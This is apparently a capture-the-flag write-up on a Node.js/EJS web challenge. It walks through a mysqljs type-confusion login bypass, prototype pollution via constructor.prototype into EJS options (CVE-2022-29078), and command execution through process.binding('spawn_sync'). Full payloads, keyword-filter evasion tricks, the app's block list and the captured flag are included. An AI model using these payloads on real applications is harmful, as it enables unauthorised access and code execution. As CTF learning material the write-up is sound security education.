## pr0t0typ3 p011ut10n  

<img src="images/chall.png" width=600>

### Vulnerability Analysis  

The challenge app has an `/admin` endpoint that allows us to send JSON data which it will parse using an unsafe `merge()` function. There is a prototype pollution vulnerability in `merge()` as it doesn't perform any validations before settings the keys.  

The `/admin` endpoint does enforce a blacklist that appears to prevent RCE.  

```ts
// utils/merge.ts
function isObject(obj: any) {
  return typeof obj === 'function' || typeof obj === 'object';
}

export function clone(target: any) {
  const d = {};
  const visited = new WeakSet(); // to avoid circular reference
  
  function merge(target: any, source: any) {
    if (visited.has(source)) {
      return target;
    }
    
    visited.add(source);
    
    for (let key in source) {
      if (isObject(target[key]) && isObject(source[key])) {
        merge(target[key], source[key]);
      } else {
        target[key] = source[key];
      }
    }
    return target;
  }

  return merge(d, target);
}

...

// routers/admin.ts
router.post('/', async (req, res) => {
  try {
    const body = JSON.stringify(req.body).toLowerCase();

    const keywords = ['flag', 'app', '+', ' ', 'join', '!', '[', ']', '$', '_', '`', 'global', 'this', 'return', 'fs', 'child', 'eval', 'object', 'buffer', 'from', 'atob', 'btoa', '\\x', '\\u', '%']; //TODO: add more keywords. process, binding, etc.
  
    const result = keywords.filter(keyword => body.includes(keyword));
    if (result.length > 0) {
        if (
          !result.includes(' ') ||
          (result.includes(' ') && result.length > 1) ||
          (result.includes(' ') &&
            result.length === 1 &&
            body.split(' ').length !== 2)
        ) {
            return res.status(400).json({ error: 'Filtered! - ' + result.join(', ') });
        }
    }
  
    const data = clone(req.body);
    return res.json(data);
  } catch (e) {
    return res.status(500).json({ error: 'Internal Server Error' });
  }
});

export default router;
```

In `package.json`, we can see that the app uses `ejs@3.1.10`, and this has [CVE-2022-29078
](https://security.snyk.io/vuln/SNYK-JS-EJS-2803307).   

```json
{
    "name": "pr0t0typ3-p011ut10n",
    "version": "1.0.0",
    "author": {
        "name": "bmcyver"
    },
    "type": "module",
    "scripts": {
        "start": "node --no-warnings --loader ./esm-loader.js dist/index.js",
        "build": "tsc",
        "dev": "pnpm build && pnpm start",
        "lint": "eslint ./src --fix"
    },
    "dependencies": {
        "ejs": "3.1.10",
        "express": "^4.21.1",
        "jsonwebtoken": "^9.0.2",
        "mysql2": "^3.11.3"
    },
    "devDependencies": {
        "@types/ejs": "^3.1.5",
        "@types/express": "^4.17.21",
        "@types/jsonwebtoken": "^9.0.7",
        "@types/node": "^20",
        "typescript": "^5.6.2"
    }
}
```

The challenge dist also shows that `flag` will be in the root directory of challenge folder, so we have to use the aforementioned CVE to get RCE to read the flag file.  

<img src="images/dir.png" width=600>

However, the `/admin` endpoint requires us to be logged in before we can do any prototype pollution.  

```ts
router.use((req, res, next) => {
  if (req.username !== 'admin') { 
    return res.status(403).json({ error: 'Forbidden' });
  }
  next();
});
```

The user database is initialised with a default `admin` user with a cryptographically secure password.  

```ts
export async function getDB() {
  if (db) return db;

  console.info('Connecting to database...');
  await sleep(10000);

  const connection = await mysql.createConnection({
    host: 'db',
    user: 'root',
    database: 'test',
    password: 'password',
  });

  try {
    await connection.query('DROP TABLE IF EXISTS users');
    await connection.query(
      'CREATE TABLE IF NOT EXISTS users (id INT AUTO_INCREMENT PRIMARY KEY, username TEXT NOT NULL UNIQUE, password TEXT NOT NULL)',
    );
    await connection.query('DELETE FROM users');
    await connection.query(
      `INSERT INTO users (username, password) VALUES (?, ?)`,
      ['admin', crypto.randomBytes(32).toString('hex')],
    );
    await connection.query(
      `INSERT INTO users (username, password) VALUES (?, ?)`,
      ['guest', 'guest'],
    );
    await connection.query(
      `INSERT INTO users (username, password) VALUES (?, ?)`,
      ['dream', 'hack'],
    );
  } catch (e) {
    console.error(e);
  }

  db = connection;

  return db;
}
```

The app uses JWT tokens with cryptographically secure secrets for authentication, so we can forget about any JWT forging exploits.  

```ts
import jwt from 'jsonwebtoken';
import crypto from 'crypto';

const SECRET = crypto.randomBytes(64).toString('hex');

export function sign(user: { username: string, password: string }): string {
  return jwt.sign(user, SECRET, { expiresIn: '1h', algorithm: 'HS256' });
}

export function verify(token: string): { username: string } | null {
  try {
    return jwt.verify(token, SECRET, { algorithms: ['HS256'] }) as {
      username: string;
    };
  } catch (e) {
    console.error('JWT verification failed', e);
    return null;
  }
}
```

Instead, the auth bypass vuln lies in the `/login` endpoint in the `auth` router. `/login` doesn't validate the data type of our inputs, so we could potentially abuse this to cause some unintended behaviour and get admin login.  

```ts
router.post('/login', async (req, res) => {
  try {
    const { username, password } = req.body;
    if (!username || !password) {
      return res.status(400).json({ error: 'Invalid input' });
    }
  
    const db = await getDB();
  
    const [rows, fields]: [User[], FieldPacket[]] = await db.query(
      'SELECT * FROM users WHERE username = ? and password = ? LIMIT 1',
      [username, password],
    );
  
    if (rows.length !== 1) {
      return res.status(401).json({ error: 'Invalid credentials' });
    }
  
    const token = sign({ username: rows[0].username, password: rows[0].password });
    return res.json({ token });
  } catch (e) {
    console.error(e);
    return res.status(500).json({ error: 'Internal Server Error.' });
  }
});
```

### Exploit  

To get admin login, we can submit this payload to `/login`.  

```json
{"username": "admin", "password": {"password": 1}}
```

`mysqljs`'s attempt to parse the `password` field object will result in this query, which will give us auth bypass.  

```sql
SELECT * FROM users WHERE username = 'admin' and password = `password` = 1 LIMIT 1
```

The webpage will then return the admin's JWT token, which we can use to access the `/admin` endpoint and use prototype pollution to get code injection in EJS.  

The blacklist in `/admin` blocks `_` which means can't use `__proto__` for prototype pollution, so we have to use `constructor.prototype` instead.  

We can craft a base payload as shown below that will allow us to control the index page of the website by polluting EJS rendering options.  

```json
{
    "constructor": {
        "prototype": {
            "settings": {
                "view options": {
                    "client": true,
                    "escapeFunction": "1; return 'hacked';"
                }
            }
        }
    }
}
```

However, getting RCE isn't that straightforward, as the blacklist explicitly filters `return`, which means we can't control the final string EJS renders on the index page.  

```ts
const keywords = ['flag', 'app', '+', ' ', 'join', '!', '[', ']', '$', '_', '`', 'global', 'this', 'return', 'fs', 'child', 'eval', 'object', 'buffer', 'from', 'atob', 'btoa', '\\x', '\\u', '%'];
```

The next best way to view our RCE output would be to display the result as an error message.  

The app uses this function to capture error messages, and since `err.message` is `undefined` by default, we can do another prototype pollution to set it to our RCE output.  

```ts
app.use(((err, req, res, next) => {
  console.error(err);
  const status = err.status ?? 500;
  return res.status(status).json({
    message: err.message,
    status,
  });
}) as ErrorRequestHandler);
```

Also, since the challenge docker uses the `node:20` image where `process.mainModule.require()` has been deprecated, we can't just use `process.mainModule.require('child_process').execSync()` to execute system commands.  

```dockerfile
FROM node:20-alpine@sha256:c13b26e7e602ef2f1074aef304ce6e9b7dd284c419b35d89fcf3cc8e44a8def9

WORKDIR /app

COPY ./deploy .

RUN npm ci
RUN npm install -g typescript
RUN npm run build

EXPOSE 3000

CMD ["npm", "start"]
```

We can use `process.binding()` to access `/bin/busybox` in the `node:20` image and execute system commands.  

This gives us the payload below, which will pollute `err.message` with our command output and force EJS to throw an error, which will cause the website to render our command output as the error message.  

```js
1;

Object.prototype.message=process.binding('spawn_sync').spawn({
    file: '/bin/busybox',
    args: ['ash', '-c', 'cat flag'],
    stdio: [
      { type: 'pipe', readable: true, writable: false },
      { type: 'pipe', readable: false, writable: true },
      { type: 'pipe', readable: false, writable: true }
    ],
  }).output[1].toString();

throw 1;
```

Now that we have the main RCE logic, we can focus on bypassing the rest of the blacklist.  

The most straightforward way would be to convert our main payload to ASCII values, then decode and execute it with `Function()`.  

Since `from` is blacklisted, we can't use `String.fromCharCode()` to decode the ASCII values, and must use the `TextDecoder()` class instead.  

Spaces are blacklisted as well, but we can bypass this by replacing them with `/**/` comments.  

```ts
1;Function(new/**/TextDecoder("utf-8").decode(new Uint8Array(Array(<payload ascii values>))))();throw/**/1;
```

Executing our payload with the prototype pollution vuln from earlier will then get the index page to render the flag.  

<img src="images/flag.png" width=600>

Flag: `DH{pR0T0tYp3_p0lluT10n_t0_rc3.pLz_5h4R3_y0uR_s0lu710N!!.zQDbcO}`